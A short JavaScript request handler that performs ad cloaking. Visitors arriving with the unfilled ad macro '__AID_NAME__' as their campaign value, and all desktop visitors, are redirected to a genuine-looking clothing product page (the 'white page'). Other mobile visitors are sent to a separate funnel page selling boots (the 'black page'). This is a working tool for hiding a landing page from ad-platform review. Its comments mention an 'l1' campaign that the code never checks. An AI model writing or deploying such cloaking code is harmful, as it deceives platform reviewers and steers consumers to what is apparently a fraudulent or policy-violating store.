export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://indusrobe.com/collections/shorts-for-men/products/dark-brown-paneled-short-fro-men-2-quarter-terry-fabric-twoside-pockets-and-one-back-pockect?variant=43974242828545";
    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/chelsea-boden-boots-1737294312209574-1737906344046855";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
